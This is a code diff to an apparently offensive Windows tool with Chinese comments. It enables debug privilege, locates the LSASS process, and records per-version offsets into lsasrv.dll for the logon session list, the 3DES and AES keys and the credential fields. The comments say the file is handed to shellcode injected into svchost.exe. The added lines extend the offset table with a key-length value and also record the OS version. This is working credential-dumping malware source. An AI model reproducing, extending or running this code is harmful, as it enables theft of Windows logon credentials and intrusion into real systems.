@@ -61,14 +61,14 @@ DWORD offset_table[TABLE_LENGTH] = {
 	0x1FA63
 };
 
-DWORD _offset_table[TABLE_LENGTH][4] = {
-	  {0x32BC3,0x39E5C,0x9E36E,0x108},
-	  {0x1FA63,0x395DC,0x8CA6C,0x108},
-	  {0x16150,0x111DE,0x3261B,0xE8},
-	  {0x2D2B3,0x1C55C,0x4250C,0x108},
-	  {0x285FF,0x3992C,0x399EC,0x108},
-	  {0x1E162,0x1944C,0x1950C,0x108},
-	  {0x1C448,0x193EE,0x39B2A,0xE8}
+DWORD _offset_table[TABLE_LENGTH][5] = {
+	  {0x32BC3,0x39E5C,0x9E36E,0x108,0x38},
+	  {0x1FA63,0x395DC,0x8CA6C,0x108,0x38},
+	  {0x16150,0x111DE,0x3261B,0xE8,0x18},
+	  {0x2D2B3,0x1C55C,0x4250C,0x108,0x38},
+	  {0x285FF,0x3992C,0x399EC,0x108,0x38},
+	  {0x1E162,0x1944C,0x1950C,0x108,0x38},
+	  {0x1C448,0x193EE,0x39B2A,0xE8,0x18},
 };
 void getosversion(char* result) {
 	char buffer[1024] = { 0 };
@@ -162,9 +162,9 @@ int main(int argc, char** argv)
 	}
 
 
-		
-		
-		
+
+
+
 	EnableDebugPrivilege();
 	DWORD pid = GetLsassPid();
 	// 我需要先获取lsasrv.dll的版本信息，从而得到关键的3个符号的偏移量信息
@@ -186,8 +186,8 @@ int main(int argc, char** argv)
 			offset = 1;
 			// 记录下来这个索引，写入到文件中，供注入到svchost.exe进程中的shellcode去读取
 			char write_out[123] = { 0 };
-			sprintf_s(write_out,123, "%03d", i);
-			sprintf_s(write_out+3,120, "%07d", pid);
+			sprintf_s(write_out, 123, "%03d", i);
+			sprintf_s(write_out + 3, 120, "%07d", pid);
 
 			// 我们从_offset_table中根据上面获取到的index，写入四个偏移量
 			// logonsessionlist、3des、aes、credential字段在logonsessionlist节点中的偏移
@@ -200,7 +200,11 @@ int main(int argc, char** argv)
 			sprintf_s(write_out + 3 + 7 + 8, 123, "%08x", _offset_table[i][1]);
 			sprintf_s(write_out + 3 + 7 + 8 + 8, 123, "%08x", _offset_table[i][2]);
 			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8, 123, "%08x", _offset_table[i][3]);
+			// _3des_aes_len_offset   windows10系列和windows7系列有点不一样
+			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8, 123, "%02x", _offset_table[i][4]);
 
+			// 把版本号也写进去
+			sprintf_s(write_out + 3 + 7 + 8 + 8 + 8 + 8+2, 123, "%s", res);
 
 
 			FILE* fptr;
@@ -273,7 +277,7 @@ int main(int argc, char** argv)
 
 	// Close the file handle
 	CloseHandle(hFile);
-		
+
 	// Now byteArray contains the binary data from the file
 
 	printf("Successfully read %lu bytes from the file: %s\n", bytesRead, filePath);
